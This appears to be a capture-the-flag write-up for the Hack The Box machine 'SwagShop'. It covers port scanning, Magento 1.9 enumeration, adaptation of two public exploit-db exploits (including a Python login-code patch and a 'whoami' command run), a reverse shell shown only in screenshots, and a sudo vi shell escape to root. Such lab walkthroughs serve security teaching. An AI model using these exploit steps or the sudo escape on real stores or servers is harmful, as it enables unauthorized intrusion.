# SwagShop

![SwagShop](<../../../.gitbook/assets/image (17).png>)

## Reconnaissance <a href="#491d" id="491d"></a>

First thing we want to do is run rustscan and see what services are available

```hcl
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.204.24:22
Open 10.129.204.24:80
[~] Starting Script(s)
[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-06 19:41 EDT
Initiating Ping Scan at 19:41
Scanning 10.129.204.24 [4 ports]
Completed Ping Scan at 19:41, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:41
Completed Parallel DNS resolution of 1 host. at 19:41, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 5, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 19:41
Scanning 10.129.204.24 [2 ports]
Discovered open port 80/tcp on 10.129.204.24
Discovered open port 22/tcp on 10.129.204.24
Completed SYN Stealth Scan at 19:41, 0.07s elapsed (2 total ports)
Nmap scan report for 10.129.204.24
Host is up, received echo-reply ttl 63 (0.034s latency).
Scanned at 2022-07-06 19:41:46 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
```

Port 80 is open and viewing the site we see this

![](<../../../.gitbook/assets/image (22).png>)

After adding swagshop.htb to my `/etc/hosts` file we see this

![](<../../../.gitbook/assets/image (15).png>)

## Enumeration

The site is running Magento, which is an open-source e-commerce platform written in PHP.&#x20;

It looks like there is not an easy way too enumerate users

![](<../../../.gitbook/assets/image (24).png>)

The copyright at the bottom of the page says 2014 so this has not been updated in a while. We can use something called [magescan](https://github.com/steverobbins/magescan) to get some information

Running `php magescan.phar scan:all swagshop.htb > output.scan` we get (truncated).

{% code title="output.scan" %}
```
Scanning http://swagshop.htb/...

                       
  Magento Information  
                       

+-----------+------------------+
| Parameter | Value            |
+-----------+------------------+
| Edition   | Community        |
| Version   | 1.9.0.0, 1.9.0.1 |
+-----------+------------------+

  Installed Modules  
                     

No detectable modules were found

           
  Sitemap  
           

Sitemap is not declared in robots.txt
Sitemap is not accessible: http://swagshop.htb/sitemap.xml

                     
  Server Technology  
                     

+--------+------------------------+
| Key    | Value                  |
+--------+------------------------+
| Server | Apache/2.4.18 (Ubuntu) |
+--------+------------------------+

                          
  Unreachable Path Check  
                          

+----------------------------------------------+---------------+--------+
| Path                                         | Response Code | Status |
+----------------------------------------------+---------------+--------+
| app/etc/local.xml                            | 200           | Fail   |
| index.php/rss/order/NEW/new                  | 200           | Fail   |
| shell/                                       | 200           | Fail   |
+----------------------------------------------+---------------+--------+
```
{% endcode %}

Doing a quick searchsploit for magento we get

![](<../../../.gitbook/assets/image (20).png>)

The authenticated one looks good but none of the combos I tried worked so I am going to skip that

Exploit 37977 looks interesting though, we can see it here: [https://www.exploit-db.com/exploits/37977](https://www.exploit-db.com/exploits/37977)

## Exploitation

For the exploit script I added the target

![](<../../../.gitbook/assets/image (29).png>)

After running it we have a bit of a problem

![](<../../../.gitbook/assets/image (3).png>)

Looking in the script it is trying to go to `target + /admin/Cms_Wysiwyg/directive/index/`

Looking at the site we cant hit that

![](<../../../.gitbook/assets/image (28).png>)

Looking at the working site itt has `index.php` in the url so trying that it looks like it works

![](<../../../.gitbook/assets/image (27).png>)

After making a slight change to the script things look to be working

![](<../../../.gitbook/assets/image (26).png>)

![](<../../../.gitbook/assets/image (9).png>)

We got the admin panel!!!

![](<../../../.gitbook/assets/image (23).png>)

## Initial Access

Now that we are authenticated lets try that other exploit found here: [https://www.exploit-db.com/exploits/37811](https://www.exploit-db.com/exploits/37811)

Modifying the config to the correct install date and the credentials we got from the exploiit

![](<../../../.gitbook/assets/image (6).png>)

We get a “mechanize.\_form\_controls.ControlNotFoundError”.

![](<../../../.gitbook/assets/image (5).png>)

After searchiing google I found this on stackoverflow: [https://stackoverflow.com/questions/35226169/clientform-ambiguityerror-more-than-one-control-matching-name](https://stackoverflow.com/questions/35226169/clientform-ambiguityerror-more-than-one-control-matching-name)

We need to make a slight code change

```python
## Comment out this code found in the script

#br.form.new_control('text', 'login[username]', {'value': username})  
#br.form.fixup()
#br['login[username]'] = username
#br['login[password]'] = password

## Add this code in place of what is above

userone = br.find_control(name="login[username]", nr=0)
userone.value = username
pwone = br.find_control(name="login[password]", nr=0)
pwone.value = password
```

Running `python2 37811.py http://10.129.204.24/index.php/admin/ "whoami"` we get another issue

![](<../../../.gitbook/assets/image (13).png>)

We also need to follow redirects it looks like

![](<../../../.gitbook/assets/image (31).png>)

There was also another issue that I found because the machine was old and not patched recently but you have to create a shipment and make sure it is in the processnig state. I found a note on the forum here: [https://forum.hackthebox.com/t/swagshop/1539/1229](https://forum.hackthebox.com/t/swagshop/1539/1229)

Now running the exploit we get output!

![](<../../../.gitbook/assets/image (32).png>)

Time to get a shell back

![](<../../../.gitbook/assets/image (30).png>)

Here we can find user.txt

{% hint style="warning" %}
Note: I have hidden part of the flag
{% endhint %}

<details>

<summary>user.txt</summary>

14ec7eda2d7de9a1\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

</details>

## Privilege Escalation

Running `sudo -l` we see something interesting

![](<../../../.gitbook/assets/image (21).png>)

We are allowed to run sudo on any files in `/var/www/html/`

Running this gets us root!

```bash
sudo vi /var/www/html/bla -c ':!/bin/sh'
```

{% hint style="warning" %}
Note: I have hidden part of the flag
{% endhint %}

<details>

<summary>root.txt</summary>

e8b205cbe5faa101\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

</details>

## Lessons Learned

1. Make sure to check for information disclosure. The `/app/etc/local.xml` file was exposed to everyone!
2. Always read the scripts and understand what they are doing. I got held up the longest because there were no shipments in the last 2 years so I had to create one in the admin panel to get the exploit to work.
